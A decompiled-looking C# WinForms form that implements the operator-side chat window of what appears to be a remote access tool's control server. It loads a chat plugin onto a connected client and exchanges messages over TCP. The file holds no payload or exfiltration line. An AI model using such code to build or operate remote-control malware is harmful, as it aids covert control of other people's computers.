using System;
using System.ComponentModel;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Server.Algorithm;
using Server.Connection;
using Server.MessagePack;

namespace Server.Forms;

public class FormChat : Form
{
	private string Nickname = "Admin";

	private IContainer components;

	public RichTextBox richTextBox1;

	public System.Windows.Forms.Timer timer1;

	public TextBox textBox1;

	public Form1 F { get; set; }

	internal Clients ParentClient { get; set; }

	internal Clients Client { get; set; }

	public FormChat()
	{
		InitializeComponent();
	}

	private void TextBox1_KeyDown(object sender, KeyEventArgs e)
	{
		if (textBox1.Enabled && e.KeyData == Keys.Return && !string.IsNullOrWhiteSpace(textBox1.Text))
		{
			richTextBox1.AppendText("ME: " + textBox1.Text + Environment.NewLine);
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "chatWriteInput";
			msgPack.ForcePathObject("Input").AsString = Nickname + ": " + textBox1.Text;
			ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
			textBox1.Clear();
		}
	}

	private void FormChat_Load(object sender, EventArgs e)
	{
		string text = Interaction.InputBox("TYPE YOUR NICKNAME", "CHAT", "Admin");
		if (string.IsNullOrEmpty(text))
		{
			Close();
			return;
		}
		Nickname = text;
		MsgPack msgPack = new MsgPack();
		msgPack.ForcePathObject("Packet").AsString = "plugin";
		msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Chat.dll");
		ThreadPool.QueueUserWorkItem(ParentClient.Send, msgPack.Encode2Bytes());
	}

	private void FormChat_FormClosed(object sender, FormClosedEventArgs e)
	{
		if (Client != null)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "chatExit";
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			if (!ParentClient.TcpClient.Connected || !Client.TcpClient.Connected)
			{
				Close();
			}
		}
		catch
		{
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Server.Forms.FormChat));
		this.richTextBox1 = new System.Windows.Forms.RichTextBox();
		this.textBox1 = new System.Windows.Forms.TextBox();
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		base.SuspendLayout();
		this.richTextBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.richTextBox1.BackColor = System.Drawing.SystemColors.Window;
		this.richTextBox1.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.richTextBox1.Location = new System.Drawing.Point(12, 12);
		this.richTextBox1.Name = "richTextBox1";
		this.richTextBox1.ReadOnly = true;
		this.richTextBox1.Size = new System.Drawing.Size(733, 351);
		this.richTextBox1.TabIndex = 0;
		this.richTextBox1.Text = "";
		this.textBox1.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.textBox1.Enabled = false;
		this.textBox1.Location = new System.Drawing.Point(0, 384);
		this.textBox1.Name = "textBox1";
		this.textBox1.Size = new System.Drawing.Size(757, 26);
		this.textBox1.TabIndex = 1;
		this.textBox1.KeyDown += new System.Windows.Forms.KeyEventHandler(TextBox1_KeyDown);
		this.timer1.Interval = 1000;
		this.timer1.Tick += new System.EventHandler(Timer1_Tick);
		base.AutoScaleDimensions = new System.Drawing.SizeF(9f, 20f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.SystemColors.Window;
		base.ClientSize = new System.Drawing.Size(757, 410);
		base.Controls.Add(this.textBox1);
		base.Controls.Add(this.richTextBox1);
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.Name = "FormChat";
		this.Text = "FormChat";
		base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(FormChat_FormClosed);
		base.Load += new System.EventHandler(FormChat_Load);
		base.ResumeLayout(false);
		base.PerformLayout();
	}
}
